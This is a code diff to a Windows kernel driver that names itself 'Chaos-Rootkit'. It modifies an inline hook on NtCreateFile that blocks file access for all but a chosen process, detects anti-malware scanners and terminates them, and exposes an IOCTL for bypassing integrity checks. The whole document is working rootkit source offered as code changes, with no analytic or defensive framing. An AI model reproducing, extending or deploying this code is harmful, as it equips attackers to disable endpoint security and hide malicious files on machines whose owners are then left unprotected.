@@ -46,6 +46,7 @@ typedef struct x_hooklist {
     void* NtCreateFileAddress;
     uintptr_t* NtCreateFileHookAddress;
 
+    int takeCopy;
     int pID;
     wchar_t filename[MAX_PATH];
     UNICODE_STRING decoyFile;
@@ -117,7 +118,7 @@ NTSTATUS WINAPI FakeNtCreateFile2(
                     {
                         DbgPrint("anti-malware trying to scan it!!\n");
 
-                        NTSTATUS status = ZwTerminateProcess(NtCurrentProcess(), STATUS_SUCCESS);
+                        NTSTATUS status = ZwTerminateProcess(ZwCurrentProcess(), STATUS_SUCCESS);
                         if (!NT_SUCCESS(status)) {
                             DbgPrint("Failed to terminate the anti-malware: %08X\n", status);
                         }
@@ -204,9 +205,6 @@ NTSTATUS WINAPI FakeNtCreateFile(
     {
         __try {
 
-
-            write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFileOrigin, sizeof(xHooklist.NtCreateFileOrigin));
-
             if (ObjectAttributes &&
                 ObjectAttributes->ObjectName &&
                 ObjectAttributes->ObjectName->Buffer)
@@ -221,30 +219,53 @@ NTSTATUS WINAPI FakeNtCreateFile(
 
                     DbgPrint("requestor pid %d\n", requestorPid = FltGetRequestorProcessId(&flt));
 
-                    if ((ULONG)requestorPid == (ULONG)xHooklist.pID)
+                    if ((ULONG)requestorPid == (ULONG)xHooklist.pID || !requestorPid) // more testing need to be done at this part ,used 0 to avoid restricting the same process ...
                     {
 
                         DbgPrint("process allowed\n");
 
-                        NTSTATUS FakeStatus = NtCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);
-
-                        write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFilePatch, sizeof(xHooklist.NtCreateFilePatch));
+                        NTSTATUS FakeStatus = IoCreateFile(
+                            FileHandle,
+                            DesiredAccess,
+                            ObjectAttributes,
+                            IoStatusBlock,
+                            AllocationSize,
+                            FileAttributes,
+                            ShareAccess,
+                            CreateDisposition,
+                            CreateOptions,
+                            EaBuffer,
+                            EaLength,
+                            CreateFileTypeNone,
+                            (PVOID)NULL,
+                            0
+                        );
 
                         return (FakeStatus);
                     }
-
-                    write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFilePatch, sizeof(xHooklist.NtCreateFilePatch));
 
                     return (STATUS_ACCESS_DENIED);
                 }
 
             }
 
-            NTSTATUS FakeStatus = NtCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);
-
-            write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFilePatch, sizeof(xHooklist.NtCreateFilePatch));
-
-            return (FakeStatus);
+            NTSTATUS status = IoCreateFile(
+                FileHandle,
+                DesiredAccess,
+                ObjectAttributes,
+                IoStatusBlock,
+                AllocationSize,
+                FileAttributes,
+                ShareAccess,
+                CreateDisposition,
+                CreateOptions,
+                EaBuffer,
+                EaLength,
+                CreateFileTypeNone,
+                (PVOID)NULL,
+                0
+            );
+            return (status);
         }
         __except (GetExceptionCode() == STATUS_ACCESS_VIOLATION
             ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)
@@ -268,23 +289,15 @@ DWORD initializehooklist(Phooklist hooklist_s, fopera rfileinfo, int Option)
 
     }
 
-    if (hooklist_s->NtCreateFileAddress && Option == 1)
+    if (hooklist_s->NtCreateFileAddress == (uintptr_t)&FakeNtCreateFile && Option == 1)
     {
-        DbgPrint("Hook already active \n");
+        DbgPrint("Hook already active for function 1\n");
         return (-1);
     }
-
-    if (hooklist_s->NtCreateFileAddress && Option == 2)
+    else if (hooklist_s->NtCreateFileAddress == (uintptr_t)&FakeNtCreateFile2 && Option == 2)
     {
-
-        DbgPrint("Hook already active for NtCreateFile \n");
-
-        if (hooklist_s->NtCreateFileHookAddress != (uintptr_t*)&FakeNtCreateFile2)
-        {
-            DbgPrint("unhooking ... \n");
-
-            write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFileOrigin, sizeof(xHooklist.NtCreateFileOrigin));
-        }
+        DbgPrint("Hook already active for function 2\n");
+        return (-1);
     }
 
     UNICODE_STRING NtCreateFile_STRING = RTL_CONSTANT_STRING(L"NtCreateFile");
@@ -339,14 +352,20 @@ DWORD initializehooklist(Phooklist hooklist_s, fopera rfileinfo, int Option)
 
     memcpy(hooklist_s->NtCreateFilePatch + 2, &hooklist_s->NtCreateFileHookAddress, sizeof(void*));
 
-    memcpy(hooklist_s->NtCreateFileOrigin, hooklist_s->NtCreateFileAddress, 12);
 
+    if (hooklist_s->takeCopy == 0)
+    {
+        DbgPrint("taking a copy before hook.. \n");
+        memcpy(hooklist_s->NtCreateFileOrigin, hooklist_s->NtCreateFileAddress, 12);
+        hooklist_s->takeCopy = 69;
+    }
     hooklist_s->pID = rfileinfo.rpid;
+
     RtlCopyMemory(hooklist_s->filename, rfileinfo.filename, sizeof(rfileinfo.filename));
 
     write_to_read_only_memory(hooklist_s->NtCreateFileAddress, &hooklist_s->NtCreateFilePatch, sizeof(hooklist_s->NtCreateFilePatch));
 
-    DbgPrint("Hooks installed resolved\n");
+    DbgPrint("Hooks installed \n");
 
     return (0);
 }
@@ -751,13 +770,12 @@ NTSTATUS processIoctlRequest(
                 }
                 fopera rfileinfo = { 0 };
                 RtlCopyMemory(&rfileinfo, Irp->AssociatedIrp.SystemBuffer, sizeof(rfileinfo));
+
                 pstatus = initializehooklist(&xHooklist, rfileinfo,1);
-
-
                 DbgPrint("File access restricted ");
                 break;
             }
-            case BYPASS_INTEGRITY_FILE_CTL:
+            case BYPASS_INTEGRITY_FILE_CTL: // 
             {
                 if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(fopera))
                 {
@@ -766,7 +784,6 @@ NTSTATUS processIoctlRequest(
                 }
                 fopera rfileinfo = { 0 };
                 RtlCopyMemory(&rfileinfo, Irp->AssociatedIrp.SystemBuffer, sizeof(rfileinfo));
-
                 pstatus = initializehooklist(&xHooklist, rfileinfo,2);
 
                 DbgPrint("bypass integrity check ");
@@ -973,21 +990,26 @@ DriverEntry(
     PUNICODE_STRING registryPath
 )
 {
-    ExInitializePushLock(&pLock);
 
+    DbgPrint("Chaos-Rootkit Loaded ...\n");
+
+    ExInitializePushLock(&pLock);
 
     UNREFERENCED_PARAMETER(registryPath);
     UNREFERENCED_PARAMETER(driverObject);
 
     NTSTATUS status = IoCreateDevice(driverObject, 0, &DeviceName, FILE_DEVICE_UNKNOWN, METHOD_BUFFERED, FALSE, &driverObject->DeviceObject);
 
-    if (!NT_SUCCESS(status)) {
+    if (!NT_SUCCESS(status))
+    {
         DbgPrint(("Failed to create device object (0x%08X)\n", status));
         return (STATUS_UNSUCCESSFUL);
     }
+
     status = IoCreateSymbolicLink(&SymbName, &DeviceName);
 
-    if (!NT_SUCCESS(status)) {
+    if (!NT_SUCCESS(status))
+    {
         DbgPrint(("Failed to create Symbolic link (0x%08X)\n", status));
         IoDeleteDevice(driverObject->DeviceObject);
         return (STATUS_UNSUCCESSFUL);
